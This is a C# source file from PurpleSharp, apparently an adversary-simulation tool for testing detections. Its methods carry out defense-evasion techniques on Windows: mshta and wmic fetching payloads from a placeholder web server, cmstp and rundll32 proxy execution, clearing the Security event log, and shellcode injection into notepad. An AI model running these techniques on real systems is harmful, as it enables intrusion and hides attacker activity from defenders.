using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using PurpleSharp.Lib;
using System.IO;

namespace PurpleSharp.Simulations
{
    public class DefenseEvasion
    {

        public static void Csmtp(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationStart("T1191");
            logger.SimulationDetails();
            try
            {
                string file = @"C:\Users\Administrator\AppData\Local\Temp\XKNqbpzl.txt";
                ExecutionHelper.StartProcess("", String.Format("cmstp.exe /s /ns {0}", file), logger);
                logger.SimulationFinished();
            }
            catch
            {
                logger.SimulationFailed();
            }
        }

        public static void Mshta(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationStart("T1170");
            logger.SimulationDetails();
            try
            {
                string url = "http://webserver/payload.hta";
                ExecutionHelper.StartProcess("", String.Format("mshta.exe {0}", url), logger);
                logger.SimulationFinished();
            }
            catch
            {
                logger.SimulationFailed();
            }
        }

        public static void XlScriptProcessing(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationStart("T1220");
            logger.SimulationDetails();
            try
            {
                string url = "http://webserver/payload.xsl";
                ExecutionHelper.StartProcess("", String.Format("wmic os get /FORMAT:\"{0}\"", url), logger);
                logger.SimulationFinished();
            }
            catch
            {
                logger.SimulationFailed();
            }
        }

        public static void Rundll32(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationStart("T1085");
            logger.SimulationDetails();
            try
            {
                string file = @"C:\Windows\twain_64.dll";
                ExecutionHelper.StartProcess("", String.Format("rundll32.exe \"{0}\"", file), logger);
                logger.SimulationFinished();
            }
            catch
            {
                logger.SimulationFailed();
            }
        }

        public static void ClearSecurityEventLogCmd(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationStart("T1070");
            logger.SimulationDetails();
            //logger.TimestampInfo(String.Format("Starting T1070 Simulation on {0}", Environment.MachineName));
            //logger.TimestampInfo(String.Format("Simulation agent running as {0} with PID:{1}", System.Reflection.Assembly.GetEntryAssembly().Location, Process.GetCurrentProcess().Id));
            try
            {
                ExecutionHelper.StartProcess("", "wevtutil.exe cl Security", logger);
                logger.SimulationFinished();
            }
            catch
            {
                logger.SimulationFailed();
            }
        }

        public static void ClearSecurityEventLogNET(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationStart("T1070");
            logger.SimulationDetails();
            //logger.TimestampInfo(String.Format("Starting T1070 Simulation on {0}", Environment.MachineName));
            //logger.TimestampInfo(String.Format("Simulation agent running as {0} with PID:{1}", System.Reflection.Assembly.GetEntryAssembly().Location, Process.GetCurrentProcess().Id));

            try
            {
                EventLog eventlog = new EventLog();
                eventlog.Source = "Security";
                eventlog.Clear();
                eventlog.Close();
                logger.TimestampInfo(String.Format("Cleared the Security EventLog using .NETs EventLog"));
                logger.SimulationFinished();
            }
            catch
            {
                //logger.TimestampInfo(String.Format("Failed to clear the Security EventLog"));
                logger.SimulationFailed();
                //logger.TimestampInfo(ex.Message.ToString());
            }

        }

        public static void ProcessInjection(string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationStart("T1055");
            logger.SimulationDetails();

            //logger.TimestampInfo(String.Format("Starting T1055 Simulation on {0}", Environment.MachineName));
            //logger.TimestampInfo(String.Format("Simulation agent running as {0} with PID:{1}", System.Reflection.Assembly.GetEntryAssembly().Location, Process.GetCurrentProcess().Id));

            try
            {

                Process proc = new Process();
                proc.StartInfo.FileName = "C:\\Windows\\system32\\notepad.exe";
                proc.StartInfo.UseShellExecute = false;
                proc.Start();
                logger.TimestampInfo(String.Format("Process {0}.exe with PID:{1} started for the injection", proc.ProcessName, proc.Id));

                DefenseEvasionHelper.ProcInjection_CreateRemoteThread(Convert.FromBase64String(Lib.Static.donut_ping), proc, logger);
                //DefenseEvasionHelper.ProcInjection_APC(Convert.FromBase64String(Lib.Static.donut_ping), proc, logger);

                //DefenseEvasionHelper.ProcInjection_CreateRemoteThread(Lib.Static.msf_meter, not);
                logger.SimulationFinished();
            }
            catch ( Exception ex)
            {
                logger.SimulationFailed();
                //logger.TimestampInfo(String.Format(ex.ToString()));
                //logger.TimestampInfo(String.Format(ex.Message.ToString()));
            }
            
        }
    }
}
